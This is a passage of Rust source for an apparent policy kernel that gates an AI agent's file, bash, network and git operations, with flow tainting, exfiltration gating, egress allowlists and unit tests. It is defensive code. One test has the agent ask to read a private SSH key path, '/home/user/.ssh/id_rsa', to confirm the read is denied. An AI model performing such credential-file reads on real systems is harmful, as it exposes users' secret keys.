                Verdict::Deny(DenyReason::CommandBlocked {
                    command: subject.to_string(),
                }),
                &pre_hash,
                pre_exposure_count,
                contributed_label,
                false,
                false,
            );
        }

        // 6. Flow control check (when enabled) — BEFORE approval paths.
        //
        // Two-phase design:
        //   a) CHECK the action against the CURRENT session label
        //   b) TAINT the session label with the operation's intrinsic label AFTER allow
        //
        // This means: reading web content is allowed (low authority requirement),
        // but the session is TAINTED afterward. The NEXT write/push/PR will be
        // checked against the tainted label and blocked if authority is insufficient.
        //
        // IMPORTANT (#654): When the FlowGraph is enabled, the flat session-level
        // label is NO LONGER used as a decision gate. The FlowGraph provides
        // precise per-action causal labels via `decide_with_parents()`, which
        // eliminates the over-tainting problem. The flat label is still updated
        // for audit/reporting purposes, but only `decide_with_parents()` enforces
        // flow policy when the graph is active.
        //
        // Without a FlowGraph, the flat label remains the enforcement mechanism
        // (backward-compatible for callers that don't use the DAG).
        if let Some(ref mut flow_label) = self.flow_label {
            use portcullis_core::flow;

            let now_unix = now.timestamp() as u64;

            // When the flow graph is enabled, skip the flat label gate.
            // Callers must use decide_with_parents() for flow-checked decisions.
            // The flat label is still updated below for audit purposes.
            let flow_graph_active = self.flow_graph.is_some();

            if !flow_graph_active {
                // Phase A: check the action against the current (pre-taint) label
                let node = flow::FlowNode {
                    id: self.next_seq,
                    kind: flow::NodeKind::OutboundAction,
                    label: *flow_label,
                    parent_count: 0,
                    parents: [0; flow::MAX_PARENTS],
                    operation: Some(operation),
                    sink_class: None,
                };

                if let flow::FlowVerdict::Deny(reason) = flow::check_flow(&node, now_unix) {
                    return self.record_with_exposure(
                        operation,
                        subject,
                        Verdict::Deny(DenyReason::FlowViolation {
                            rule: format!("{:?}", reason),
                            receipt: None,
                        }),
                        &pre_hash,
                        pre_exposure_count,
                        contributed_label,
                        false,
                        false,
                    );
                }
            }

            // Phase B: taint the session label with the operation's intrinsic
            // (always, regardless of flow_graph — for audit/reporting)
            let intrinsic = flow::intrinsic_label(Self::node_kind_for(operation), now_unix);
            *flow_label = flow_label.join(intrinsic);
        }

        // 7. Static approval check (obligations from lattice structure)
        if self.effective.requires_approval(operation) {
            if self.consume_approval(operation) {
                // Approved — record exposure from this allowed operation
                self.exposure = exposure_core::apply_record(&self.exposure, operation);
                let state_uninhabitable =
                    !ExposureSet::empty().is_uninhabitable() && self.exposure.is_uninhabitable();
                return self.record_with_exposure(
                    operation,
                    subject,
                    Verdict::Allow,
                    &pre_hash,
                    pre_exposure_count,
                    contributed_label,
                    state_uninhabitable,
                    false,
                );
            }
            return self.record_with_exposure(
                operation,
                subject,
                Verdict::RequiresApproval,
                &pre_hash,
                pre_exposure_count,
                contributed_label,
                false,
                false,
            );
        }

        // 7. Dynamic exposure gate — runtime uninhabitable_state detection.
        //
        // Gate exfil operations when:
        // a) The exposure is ALREADY uninhabitable (ongoing risk), OR
        // b) This operation WOULD complete the uninhabitable_state (transition risk)
        //
        // This ensures exfil ops remain gated for the entire session once
        // the uninhabitable_state has been reached, not just at the transition point.
        let projected = exposure_core::project_exposure(&self.exposure, operation);
        if (self.exposure.is_uninhabitable() || projected.is_uninhabitable())
            && is_exfil_operation(operation)
        {
            // Check if there's a pre-granted approval
            if self.consume_approval(operation) {
                let pre_complete = self.exposure.is_uninhabitable();
                self.exposure = exposure_core::apply_record(&self.exposure, operation);
                let newly_completed = !pre_complete && self.exposure.is_uninhabitable();
                return self.record_with_exposure(
                    operation,
                    subject,
                    Verdict::Allow,
                    &pre_hash,
                    pre_exposure_count,
                    contributed_label,
                    newly_completed,
                    true,
                );
            }
            return self.record_with_exposure(
                operation,
                subject,
                Verdict::RequiresApproval,
                &pre_hash,
                pre_exposure_count,
                contributed_label,
                false,
                true,
            );
        }

        // All checks passed — record exposure and allow
        let pre_complete = self.exposure.is_uninhabitable();
        self.exposure = exposure_core::apply_record(&self.exposure, operation);
        let state_uninhabitable = !pre_complete && self.exposure.is_uninhabitable();

        self.record_with_exposure(
            operation,
            subject,
            Verdict::Allow,
            &pre_hash,
            pre_exposure_count,
            contributed_label,
            state_uninhabitable,
            false,
        )
    }

    /// Map an Operation to the most appropriate FlowNode kind.
    fn node_kind_for(op: Operation) -> portcullis_core::flow::NodeKind {
        use portcullis_core::flow::NodeKind;
        match op {
            Operation::ReadFiles | Operation::GlobSearch | Operation::GrepSearch => {
                NodeKind::FileRead
            }
            Operation::WebFetch | Operation::WebSearch => NodeKind::WebContent,
            Operation::WriteFiles | Operation::EditFiles => NodeKind::OutboundAction,
            Operation::RunBash
            | Operation::GitCommit
            | Operation::GitPush
            | Operation::CreatePr
            | Operation::ManagePods
            | Operation::SpawnAgent => NodeKind::OutboundAction,
        }
    }

    /// Extract source and artifact labels for policy rule evaluation.
    ///
    /// When the flow graph or flat flow label is enabled, derives labels from
    /// the current flow state. Otherwise returns empty sources and a bottom
    /// label (which causes source predicates to be vacuously true and
    /// artifact predicates to match permissively).
    #[cfg(feature = "spec")]
    fn policy_flow_labels(&self) -> (Vec<portcullis_core::IFCLabel>, portcullis_core::IFCLabel) {
        if let Some(ref label) = self.flow_label {
            // Flat session label: use it as both source and artifact.
            (vec![*label], *label)
        } else {
            // No flow control — use bottom label (most permissive).
            let now = chrono::Utc::now().timestamp() as u64;
            let bottom = portcullis_core::IFCLabel::user_prompt(now);
            (vec![], bottom)
        }
    }

    /// Tighten effective permissions by taking the meet with a ceiling.
    ///
    /// This is the monotone ratchet: `effective' = effective ∧ ceiling`.
    /// Since `x ∧ y ≤ x`, the result is always ≤ the current effective.
    ///
    /// Returns an error if the ceiling would somehow increase permissions
    /// (which is impossible with a correct meet implementation, but we
    /// verify as defense in depth).
    pub fn attenuate(
        &mut self,
        ceiling: &PermissionLattice,
    ) -> Result<&PermissionLattice, MonotoneViolation> {
        let new_effective = self.effective.meet(ceiling);

        // Defense in depth: verify monotonicity
        if !new_effective.leq(&self.effective) {
            return Err(MonotoneViolation {
                dimension: "effective".to_string(),
                details: "meet result exceeds current effective permissions".to_string(),
            });
        }

        self.effective = new_effective;
        Ok(&self.effective)
    }

    /// Record budget consumption.
    ///
    /// Returns the remaining budget, or an error if exhausted.
    pub fn charge(&mut self, cost_usd: Decimal) -> Result<Decimal, DenyReason> {
        if cost_usd <= Decimal::ZERO {
            return Ok(self.effective.budget.max_cost_usd - self.consumed_usd);
        }

        let new_consumed = self.consumed_usd + cost_usd;
        if new_consumed > self.effective.budget.max_cost_usd {
            return Err(DenyReason::BudgetExhausted {
                remaining_usd: (self.effective.budget.max_cost_usd - self.consumed_usd).to_string(),
            });
        }

        self.consumed_usd = new_consumed;
        Ok(self.effective.budget.max_cost_usd - self.consumed_usd)
    }

    /// Grant pre-approval for an operation (with a count).
    ///
    /// The approval is consumed by [`Kernel::decide`] when the operation
    /// requires approval and an approval is available.
    pub fn grant_approval(&mut self, operation: Operation, count: u32) {
        let entry = self.approvals.entry(operation).or_insert(0);
        *entry = entry.saturating_add(count);

        // Record the grant in the append-only trace for audit completeness.
        let pre_hash = self.effective.checksum();
        let pre_exposure_count = self.exposure.count();
        let (_decision, _token) = self.record_with_exposure(
            operation,
            &format!("grant_approval(count={count})"),
            Verdict::Allow,
            &pre_hash,
            pre_exposure_count,
            None, // no exposure contribution from granting approval
            false,
            false,
        );
    }

    /// Set the egress policy for this session.
    ///
    /// When set, operations that contact the network (RunBash with network
    /// commands, WebFetch, GitPush, CreatePr) are checked against the
    /// allowed/denied host patterns. Default-deny: unlisted hosts are blocked.
    ///
    /// Must be called before the first `decide()` — egress policy is
    /// immutable for the session lifetime (like isolation level).
    #[cfg(feature = "spec")]
    pub fn set_egress_policy(&mut self, policy: crate::egress_policy::EgressPolicy) {
        self.egress_policy = Some(policy);
    }

    /// Get the egress policy, if set.
    #[cfg(feature = "spec")]
    pub fn egress_policy(&self) -> Option<&crate::egress_policy::EgressPolicy> {
        self.egress_policy.as_ref()
    }

    /// Set the admissibility policy rules for this session.
    ///
    /// When set, `decide()` evaluates operations against source/artifact/sink
    /// predicates after the egress check. Rules are evaluated in order (first
    /// match wins); if no rule matches, the default is deny (fail-closed).
    ///
    /// Must be called before the first `decide()` — policy rules are
    /// immutable for the session lifetime.
    #[cfg(feature = "spec")]
    pub fn set_policy_rules(&mut self, rules: portcullis_core::policy_rules::PolicyRuleSet) {
        self.policy_rules = Some(rules);
    }

    /// Get the policy rules, if set.
    #[cfg(feature = "spec")]
    pub fn policy_rules(&self) -> Option<&portcullis_core::policy_rules::PolicyRuleSet> {
        self.policy_rules.as_ref()
    }

    /// Set the enterprise allowlist for this session.
    ///
    /// When set, `decide()` checks each operation's sink class against the
    /// enterprise policy. Denied sinks are blocked regardless of local config.
    /// This acts as an organizational ceiling on all decisions.
    ///
    /// Must be called before the first `decide()` — the enterprise policy is
    /// immutable for the session lifetime.
    pub fn set_enterprise(&mut self, allowlist: portcullis_core::enterprise::EnterpriseAllowlist) {
        self.enterprise = Some(allowlist);
    }

    /// Get the enterprise allowlist, if set.
    pub fn enterprise(&self) -> Option<&portcullis_core::enterprise::EnterpriseAllowlist> {
        self.enterprise.as_ref()
    }

    /// Get the append-only session trace.
    pub fn trace(&self) -> &[Decision] {
        &self.trace
    }

    /// Get the current effective permissions.
    pub fn effective(&self) -> &PermissionLattice {
        &self.effective
    }

    /// Get the session ID.
    pub fn session_id(&self) -> Uuid {
        self.session_id
    }

    /// Get the hash of the initial permissions.
    pub fn initial_hash(&self) -> &str {
        &self.initial_hash
    }

    /// Get budget consumed so far.
    pub fn consumed_usd(&self) -> Decimal {
        self.consumed_usd
    }

    /// Get remaining budget.
    pub fn remaining_usd(&self) -> Decimal {
        self.effective.budget.max_cost_usd - self.consumed_usd
    }

    /// Get the count of decisions made.
    pub fn decision_count(&self) -> u64 {
        self.next_seq
    }

    /// Get the runtime isolation level.
    pub fn isolation(&self) -> &IsolationLattice {
        &self.isolation
    }

    /// Get the current runtime exposure accumulator.
    ///
    /// This reflects which exposure legs have been touched by allowed
    /// operations during this session. Exposure only grows — it is never
    /// reset or reduced.
    pub fn exposure(&self) -> &ExposureSet {
        &self.exposure
    }

    /// Get the session provenance, if this kernel was created from a certificate.
    ///
    /// Returns `Some` when the kernel was created via [`Kernel::from_certificate`],
    /// linking every decision in this session to the delegation chain that
    /// authorized it.
    pub fn provenance(&self) -> Option<&SessionProvenance> {
        self.provenance.as_ref()
    }

    /// Issue a DecisionToken after an external approval flow.
    ///
    /// SECURITY: Only call this after verifying the operation was approved
    /// through an external mechanism (identity policy, pre-granted approval, etc.).
    /// Records a trace entry for auditability.
    ///
    /// This exists for the case where `decide()` returned `RequiresApproval`,
    /// an external mechanism (identity policy, pre-grant store) authorized the
    /// operation, and the caller needs a token to pass to Sandbox/Executor I/O.
    /// Calling `decide()` again would double-count the operation in the exposure
    /// accumulator, so this method issues a token without re-running the full
    /// decision pipeline.
    /// # Safety contract
    ///
    /// This method bypasses the policy pipeline. The caller MUST have:
    /// 1. Called `decide()` first and received `RequiresApproval`
    /// 2. Obtained approval through a legitimate external mechanism
    ///
    /// Both `decide()` and this method are covered by Kani harnesses E1-E5.
    /// Both paths record trace entries and update exposure tracking.
    pub fn issue_approved_token(&mut self, operation: Operation, reason: &str) -> DecisionToken {
        let pre_hash = self.effective.checksum();
        let pre_exposure_count = self.exposure.count();
        self.exposure = exposure_core::apply_record(&self.exposure, operation);
        let (_, token) = self.record_with_exposure(
            operation,
            reason,
            Verdict::Allow,
            &pre_hash,
            pre_exposure_count,
            None,
            false,
            false,
        );
        token.expect("Allow verdict always produces token")
    }

    // ── Internal ──────────────────────────────────────────────────────

    /// Record a decision with exposure transition in the trace and return it
    /// along with an optional DecisionToken (present only for Allow verdicts).
    #[allow(clippy::too_many_arguments)]
    fn record_with_exposure(
        &mut self,
        operation: Operation,
        subject: &str,
        verdict: Verdict,
        pre_hash: &str,
        pre_exposure_count: u8,
        contributed_label: Option<ExposureLabel>,
        state_uninhabitable: bool,
        dynamic_gate_applied: bool,
    ) -> (Decision, Option<DecisionToken>) {
        let post_hash = self.effective.checksum();
        let post_exposure_count = self.exposure.count();
        let seq = self.next_seq;
        self.next_seq += 1;

        let token = if matches!(verdict, Verdict::Allow) {
            Some(DecisionToken {
                operation,
                sequence: seq,
                _seal: (),
            })
        } else {
            None
        };

        let decision = Decision {
            id: Uuid::new_v4(),
            sequence: seq,
            operation,
            subject: subject.to_string(),
            verdict,
            timestamp: Utc::now(),
            pre_permissions_hash: pre_hash.to_string(),
            post_permissions_hash: post_hash,
            exposure_transition: ExposureTransition {
                pre_count: pre_exposure_count,
                post_count: post_exposure_count,
                contributed_label,
                state_uninhabitable,
                dynamic_gate_applied,
            },
            flow_node_id: None,
        };

        // Append a receipt to the chain if enabled.
        if let Some(ref mut chain) = self.receipt_chain {
            let now_unix = decision.timestamp.timestamp() as u64;

            // Map kernel Verdict → FlowVerdict for the receipt.
            let flow_verdict = verdict_to_flow_verdict(&decision.verdict);

            // Gather the IFC label snapshot. Use the session flow label if
            // available, otherwise a neutral user_prompt label at the decision time.
            let label = self
                .flow_label
                .unwrap_or_else(|| portcullis_core::IFCLabel::user_prompt(now_unix));

            // Causal parent node IDs from the flow graph, if available.
            let causal_parents: Vec<portcullis_core::flow::NodeId> = decision
                .flow_node_id
                .and_then(|nid| {
                    self.flow_graph
                        .as_ref()
                        .and_then(|g| g.get(nid))
                        .map(|node| node.parents[..node.parent_count as usize].to_vec())
                })
                .unwrap_or_default();

            let prev_hash = *chain.head_hash();
            let receipt = VerdictReceipt::from_verdict(
                flow_verdict,
                format!("{:?}", decision.operation),
                &decision.subject,
                label,
                label,
                causal_parents,
                now_unix,
                prev_hash,
            );

            // Append should never fail — we computed prev_hash from chain head.
            // If it does (programming error), debug-log and continue; the receipt
            // chain is optional and must not break the decide() hot path.
            if let Err(e) = chain.append(receipt) {
                debug_assert!(false, "receipt chain append failed: {e}");
            }
        }

        self.trace.push(decision.clone());
        (decision, token)
    }

    /// Try to consume one pre-granted approval for the operation.
    fn consume_approval(&mut self, operation: Operation) -> bool {
        if let Some(count) = self.approvals.get_mut(&operation) {
            if *count > 0 {
                *count -= 1;
                return true;
            }
        }
        false
    }
}

/// Check if an operation is a path-scoped file operation.
fn is_path_operation(op: Operation) -> bool {
    matches!(
        op,
        Operation::ReadFiles
            | Operation::WriteFiles
            | Operation::EditFiles
            | Operation::GlobSearch
            | Operation::GrepSearch
    )
}

/// Check if an operation requires network access.
fn is_network_operation(op: Operation) -> bool {
    matches!(op, Operation::WebFetch | Operation::WebSearch)
}

/// Check if an operation is an exfiltration vector.
fn is_exfil_operation(op: Operation) -> bool {
    matches!(
        op,
        Operation::RunBash | Operation::GitPush | Operation::CreatePr | Operation::SpawnAgent
    )
}

/// Map a kernel [`Verdict`] to a [`FlowVerdict`] for receipt construction.
///
/// The receipt chain uses `portcullis_core::flow::FlowVerdict` which has two
/// variants: `Allow` and `Deny(FlowDenyReason)`. The kernel's `Verdict` is
/// richer (includes `RequiresApproval`), so we map:
///
/// - `Allow` → `FlowVerdict::Allow`
/// - `RequiresApproval` → `FlowVerdict::Allow` (approval was requested, not denied)
/// - `Deny(InsufficientCapability)` → `Deny(AuthorityEscalation)`
/// - `Deny(FlowViolation { rule })` → mapped by rule name
/// - All other denials → `Deny(Exfiltration)` as a conservative default
fn verdict_to_flow_verdict(verdict: &Verdict) -> portcullis_core::flow::FlowVerdict {
    use portcullis_core::flow::{FlowDenyReason, FlowVerdict};

    match verdict {
        Verdict::Allow | Verdict::RequiresApproval => FlowVerdict::Allow,
        Verdict::Deny(reason) => {
            let flow_reason = match reason {
                DenyReason::InsufficientCapability => FlowDenyReason::AuthorityEscalation,
                DenyReason::FlowViolation { rule, .. } => {
                    if rule.contains("AuthorityEscalation") {
                        FlowDenyReason::AuthorityEscalation
                    } else if rule.contains("IntegrityViolation") {
                        FlowDenyReason::IntegrityViolation
                    } else if rule.contains("FreshnessExpired") {
                        FlowDenyReason::FreshnessExpired
                    } else {
                        FlowDenyReason::Exfiltration
                    }
                }
                _ => FlowDenyReason::Exfiltration,
            };
            FlowVerdict::Deny(flow_reason)
        }
    }
}

/// Check an operation against the egress policy, returning a `DenyReason` if blocked.
///
/// Returns `None` when no egress violation is found (either the operation doesn't
/// involve network egress, or all extracted destinations are allowed).
///
/// For `RunBash`, extracts destinations from the command string using
/// [`crate::egress_extract::extract_egress_destinations`].
/// For `WebFetch`/`WebSearch`, extracts the host from the URL subject.
/// For `GitPush`/`CreatePr`, extracts the host from the remote URL subject.
#[cfg(feature = "spec")]
fn check_egress(
    operation: Operation,
    subject: &str,
    policy: &crate::egress_policy::EgressPolicy,
) -> Option<DenyReason> {
    use crate::egress_extract::extract_egress_destinations;
    use crate::egress_policy::EgressVerdict;

    /// Format the allowlist as a human-readable hint for denial messages.
    fn format_allowed_hint(policy: &crate::egress_policy::EgressPolicy) -> String {
        if policy.allowed_hosts.is_empty() {
            return "no hosts are allowed (empty allowlist)".to_string();
        }
        let hosts: Vec<String> = policy
            .allowed_hosts
            .iter()
            .take(5)
            .map(|h| h.to_string())
            .collect();
        let suffix = if policy.allowed_hosts.len() > 5 {
            format!(", ... ({} more)", policy.allowed_hosts.len() - 5)
        } else {
            String::new()
        };
        format!("allowed hosts: {}{}", hosts.join(", "), suffix)
    }

    match operation {
        Operation::RunBash => {
            // Extract all network destinations from the bash command.
            let destinations = extract_egress_destinations(subject);
            for dest in &destinations {
                if let EgressVerdict::Deny { reason } = policy.check_host(&dest.host) {
                    return Some(DenyReason::EgressBlocked {
                        host: dest.host.clone(),
                        policy_reason: format!(
                            "Blocked: network access to '{}' denied by egress policy ({} via {}). {}",
                            dest.host,
                            reason,
                            dest.command,
                            format_allowed_hint(policy),
                        ),
                    });
                }
            }
            None
        }
        Operation::WebFetch | Operation::WebSearch => {
            // Subject is the URL — extract host.
            let host = extract_host_from_subject(subject)?;
            if let EgressVerdict::Deny { reason } = policy.check_host(&host) {
                Some(DenyReason::EgressBlocked {
                    host: host.clone(),
                    policy_reason: format!(
                        "Blocked: network access to '{host}' denied by egress policy ({reason}). {}",
                        format_allowed_hint(policy),
                    ),
                })
            } else {
                None
            }
        }
        Operation::GitPush | Operation::CreatePr => {
            // Subject may be a remote URL or "origin/main" style ref.
            // Try to extract a host from it.
            let host = extract_host_from_subject(subject)?;
            if let EgressVerdict::Deny { reason } = policy.check_host(&host) {
                Some(DenyReason::EgressBlocked {
                    host: host.clone(),
                    policy_reason: format!(
                        "Blocked: network access to '{host}' denied by egress policy ({reason}). {}",
                        format_allowed_hint(policy),
                    ),
                })
            } else {
                None
            }
        }
        _ => None,
    }
}

/// Extract a hostname from a URL-like subject string.
///
/// Handles: `https://host/path`, `http://host:port/path`, `git@host:org/repo.git`,
/// and bare `hostname` strings (if they contain a dot).
#[cfg(feature = "spec")]
fn extract_host_from_subject(subject: &str) -> Option<String> {
    let trimmed = subject.trim();

    // Handle scheme://authority/path
    if let Some(rest) = trimmed
        .strip_prefix("https://")
        .or_else(|| trimmed.strip_prefix("http://"))
        .or_else(|| trimmed.strip_prefix("ftp://"))
    {
        let authority = rest.split('/').next()?;
        let host_port = authority.split('@').next_back()?;
        let host = if host_port.starts_with('[') {
            // IPv6: [::1]:8080
            host_port
                .find(']')
                .map(|end| &host_port[1..end])?
                .to_string()
        } else {
            // Strip port if present
            host_port
                .rsplit_once(':')
                .and_then(|(h, p)| p.parse::<u16>().ok().map(|_| h))
                .unwrap_or(host_port)
                .to_string()
        };
        return Some(host);
    }

    // Handle git@host:path SSH format
    if let Some(after_at) = trimmed.strip_prefix("git@") {
        let host = after_at.split(':').next()?;
        if !host.is_empty() {
            return Some(host.to_string());
        }
    }

    // Bare hostname with dots (e.g., "github.com" from "github.com:org/repo")
    let first_part = trimmed.split(':').next().unwrap_or(trimmed);
    let first_part = first_part.split('/').next().unwrap_or(first_part);
    if first_part.contains('.') && !first_part.starts_with('-') {
        return Some(first_part.to_string());
    }

    None
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::{CapabilityLevel, PermissionLattice};

    #[test]
    fn test_basic_allow() {
        let perms = PermissionLattice::safe_pr_fixer();
        let mut kernel = Kernel::new(perms);

        let (d, _token) = kernel.decide(Operation::ReadFiles, "/workspace/main.rs");
        assert!(d.verdict.is_allowed());
        assert_eq!(d.sequence, 0);
    }

    #[test]
    fn test_capability_deny() {
        let perms = PermissionLattice::safe_pr_fixer();
        let mut kernel = Kernel::new(perms);

        // safe_pr_fixer has git_push=Never
        let (d, _token) = kernel.decide(Operation::GitPush, "origin/main");
        assert!(d.verdict.is_denied());
        assert!(matches!(
            d.verdict,
            Verdict::Deny(DenyReason::InsufficientCapability)
        ));
    }

    #[test]
    fn test_trace_is_append_only() {
        let perms = PermissionLattice::safe_pr_fixer();
        let mut kernel = Kernel::new(perms);

        kernel.decide(Operation::ReadFiles, "/a");
        kernel.decide(Operation::ReadFiles, "/b");
        kernel.decide(Operation::GitPush, "/c");

        assert_eq!(kernel.trace().len(), 3);
        assert_eq!(kernel.trace()[0].sequence, 0);
        assert_eq!(kernel.trace()[1].sequence, 1);
        assert_eq!(kernel.trace()[2].sequence, 2);

        // Sequences are monotonically increasing
        for i in 1..kernel.trace().len() {
            assert!(kernel.trace()[i].sequence > kernel.trace()[i - 1].sequence);
        }
    }

    #[test]
    fn test_monotone_attenuation() {
        let perms = PermissionLattice::permissive();
        let mut kernel = Kernel::new(perms);

        // Start with permissive
        assert_eq!(
            kernel.effective().capabilities.git_push,
            CapabilityLevel::Always
        );

        // Attenuate with restrictive ceiling
        let ceiling = PermissionLattice::read_only();
        let result = kernel.attenuate(&ceiling);
        assert!(result.is_ok());

        // Git push should now be Never
        assert_eq!(
            kernel.effective().capabilities.git_push,
            CapabilityLevel::Never
        );

        // Further attenuation should also work (idempotent at bottom)
        let result = kernel.attenuate(&ceiling);
        assert!(result.is_ok());
    }

    #[test]
    fn test_budget_tracking() {
        let perms = PermissionLattice::safe_pr_fixer(); // $5 budget
        let mut kernel = Kernel::new(perms);

        // Charge $2
        let remaining = kernel.charge(Decimal::new(200, 2)).unwrap();
        assert_eq!(remaining, Decimal::new(300, 2));

        // Charge another $2
        let remaining = kernel.charge(Decimal::new(200, 2)).unwrap();
        assert_eq!(remaining, Decimal::new(100, 2));

        // Try to charge $2 more (exceeds remaining $1)
        let result = kernel.charge(Decimal::new(200, 2));
        assert!(result.is_err());
    }

    #[test]
    fn test_budget_exhaustion_denies() {
        let perms = PermissionLattice::safe_pr_fixer();
        let mut kernel = Kernel::new(perms);

        // Exhaust budget
        let _ = kernel.charge(Decimal::new(500, 2));

        // Now decide should deny
        let (d, _token) = kernel.decide(Operation::ReadFiles, "/workspace/main.rs");
        assert!(matches!(
            d.verdict,
            Verdict::Deny(DenyReason::BudgetExhausted { .. })
        ));
    }

    #[test]
    fn test_approval_grant_and_consume() {
        let perms = PermissionLattice::safe_pr_fixer();
        let mut kernel = Kernel::new(perms);

        // run_bash requires approval in safe_pr_fixer (uninhabitable_state mitigation)
        let (d, _token) = kernel.decide(Operation::RunBash, "cargo test");
        assert!(
            matches!(d.verdict, Verdict::RequiresApproval),
            "should require approval, got {:?}",
            d.verdict
        );

        // Grant 2 approvals
        kernel.grant_approval(Operation::RunBash, 2);

        // First use: approved
        let (d, _token) = kernel.decide(Operation::RunBash, "cargo test");
        assert!(d.verdict.is_allowed());

        // Second use: approved
        let (d, _token) = kernel.decide(Operation::RunBash, "cargo build");
        assert!(d.verdict.is_allowed());

        // Third use: no more approvals
        let (d, _token) = kernel.decide(Operation::RunBash, "cargo check");
        assert!(matches!(d.verdict, Verdict::RequiresApproval));
    }

    #[test]
    fn test_path_blocked() {
        let perms = PermissionLattice::safe_pr_fixer(); // blocks sensitive paths
        let mut kernel = Kernel::new(perms);

        // .ssh is blocked by path lattice
        let (d, _token) = kernel.decide(Operation::ReadFiles, "/home/user/.ssh/id_rsa");
        assert!(
            d.verdict.is_denied(),
            "should deny .ssh access, got {:?}",
            d.verdict
        );
    }

    #[test]
    fn test_session_id_stable() {
        let perms = PermissionLattice::default();
        let kernel = Kernel::new(perms);

        let id1 = kernel.session_id();
        let id2 = kernel.session_id();
        assert_eq!(id1, id2);
    }

    #[test]
    fn test_initial_hash_preserved() {
        let perms = PermissionLattice::safe_pr_fixer();
        let expected_hash = perms.checksum();
        let kernel = Kernel::new(perms);

        assert_eq!(kernel.initial_hash(), expected_hash);
    }

    #[test]
    fn test_decision_count() {
        let perms = PermissionLattice::default();
        let mut kernel = Kernel::new(perms);

        assert_eq!(kernel.decision_count(), 0);
        kernel.decide(Operation::ReadFiles, "/a");
        assert_eq!(kernel.decision_count(), 1);
        kernel.decide(Operation::ReadFiles, "/b");
        assert_eq!(kernel.decision_count(), 2);
    }

    #[test]
    fn test_zero_charge_is_noop() {
        let perms = PermissionLattice::default();
        let mut kernel = Kernel::new(perms);

        let remaining = kernel.remaining_usd();
        let result = kernel.charge(Decimal::ZERO);
        assert!(result.is_ok());
        assert_eq!(kernel.remaining_usd(), remaining);
    }

    #[test]
    fn test_negative_charge_is_noop() {
        let perms = PermissionLattice::default();
        let mut kernel = Kernel::new(perms);

        let remaining = kernel.remaining_usd();
        let result = kernel.charge(Decimal::new(-100, 2));
        assert!(result.is_ok());
        assert_eq!(kernel.remaining_usd(), remaining);
    }

    #[test]
    fn test_complete_mediation_coverage() {
        // Every Operation variant must produce a decision (not panic)
        let perms = PermissionLattice::permissive();
        let mut kernel = Kernel::new(perms);

        let operations = [
            Operation::ReadFiles,
            Operation::WriteFiles,
            Operation::EditFiles,
            Operation::RunBash,
            Operation::GlobSearch,
            Operation::GrepSearch,
            Operation::WebSearch,
            Operation::WebFetch,
            Operation::GitCommit,
            Operation::GitPush,
            Operation::CreatePr,
            Operation::ManagePods,
        ];

        for op in operations {
            let (d, _token) = kernel.decide(op, "test-subject");
            // Should not panic; verdict should be one of the three variants
            assert!(
                matches!(
                    d.verdict,
                    Verdict::Allow | Verdict::RequiresApproval | Verdict::Deny(_)
                ),
                "Operation {:?} should produce a definitive verdict, got {:?}",
                op,
                d.verdict
            );
        }

        assert_eq!(kernel.decision_count(), 12);
    }

    #[test]
    fn test_pre_post_permission_hashes_stable() {
        let perms = PermissionLattice::default();
        let mut kernel = Kernel::new(perms);

        let (d1, _token) = kernel.decide(Operation::ReadFiles, "/a");
        let (d2, _token) = kernel.decide(Operation::ReadFiles, "/b");

        // Without attenuation, hashes should be stable
        assert_eq!(d1.pre_permissions_hash, d1.post_permissions_hash);
        assert_eq!(d1.post_permissions_hash, d2.pre_permissions_hash);
    }

    #[test]
    fn test_doc_editor_kernel_session() {
        // doc-editor: read all, write docs, no network, no bash, no push
        use crate::capability::CapabilityLattice;
        let perms = PermissionLattice::builder()
            .description("doc-editor-like")
            .capabilities(CapabilityLattice {
                read_files: CapabilityLevel::Always,
                write_files: CapabilityLevel::LowRisk,
                edit_files: CapabilityLevel::LowRisk,
                run_bash: CapabilityLevel::Never,
                glob_search: CapabilityLevel::Always,
                grep_search: CapabilityLevel::Always,
                web_search: CapabilityLevel::Never,
                web_fetch: CapabilityLevel::Never,
                git_commit: CapabilityLevel::Never,
                git_push: CapabilityLevel::Never,
                create_pr: CapabilityLevel::Never,
                manage_pods: CapabilityLevel::Never,
                spawn_agent: CapabilityLevel::Never,
                extensions: std::collections::BTreeMap::new(),
            })
            .build();

        let mut kernel = Kernel::new(perms);

        // Can read
        assert!(kernel
            .decide(Operation::ReadFiles, "/workspace/README.md")
            .0
            .verdict
            .is_allowed());

        // Can write
        let (d, _token) = kernel.decide(Operation::WriteFiles, "/workspace/docs/guide.md");
        assert!(
            d.verdict.is_allowed() || matches!(d.verdict, Verdict::RequiresApproval),
            "write should be allowed or require approval"
        );

        // Cannot run bash
        assert!(kernel
            .decide(Operation::RunBash, "make docs")
            .0
            .verdict
            .is_denied());

        // Cannot push
        assert!(kernel
            .decide(Operation::GitPush, "origin/main")
            .0
            .verdict
            .is_denied());

        // Cannot fetch web
        assert!(kernel
            .decide(Operation::WebFetch, "https://example.com")
            .0
            .verdict
            .is_denied());
    }

    #[test]
    fn test_monotone_sequence_property() {
        // After attenuation, previously-allowed operations may become denied
        let perms = PermissionLattice::permissive();
        let mut kernel = Kernel::new(perms);

        // Initially allowed
        let (d, _token) = kernel.decide(Operation::GitPush, "origin/main");
        // permissive has uninhabitable_state so push requires approval, but capability is present
        assert!(!matches!(
            d.verdict,
            Verdict::Deny(DenyReason::InsufficientCapability)
        ));

        // Attenuate to read-only
        let ceiling = PermissionLattice::read_only();
        kernel.attenuate(&ceiling).unwrap();

        // Now denied
        let (d, _token) = kernel.decide(Operation::GitPush, "origin/main");
        assert!(matches!(
            d.verdict,
            Verdict::Deny(DenyReason::InsufficientCapability)
        ));
    }

    // ── Exposure plumbing tests ──────────────────────────────────────────

    #[test]
    fn test_exposure_starts_empty() {
        let perms = PermissionLattice::default();
        let kernel = Kernel::new(perms);

        assert_eq!(kernel.exposure().count(), 0);
        assert!(!kernel.exposure().is_uninhabitable());
    }

    #[test]
    fn test_exposure_accumulates_on_allow() {
        // Use a profile that allows reads and web_fetch without uninhabitable_state obligations
        use crate::capability::CapabilityLattice;
        let perms = PermissionLattice::builder()
            .description("read-and-fetch")
            .capabilities(CapabilityLattice {
                read_files: CapabilityLevel::Always,
                write_files: CapabilityLevel::Never,
                edit_files: CapabilityLevel::Never,
                run_bash: CapabilityLevel::Never,
                glob_search: CapabilityLevel::Never,
                grep_search: CapabilityLevel::Never,
                web_search: CapabilityLevel::Never,
                web_fetch: CapabilityLevel::Always,
                git_commit: CapabilityLevel::Never,
                git_push: CapabilityLevel::Never,
                create_pr: CapabilityLevel::Never,
                manage_pods: CapabilityLevel::Never,
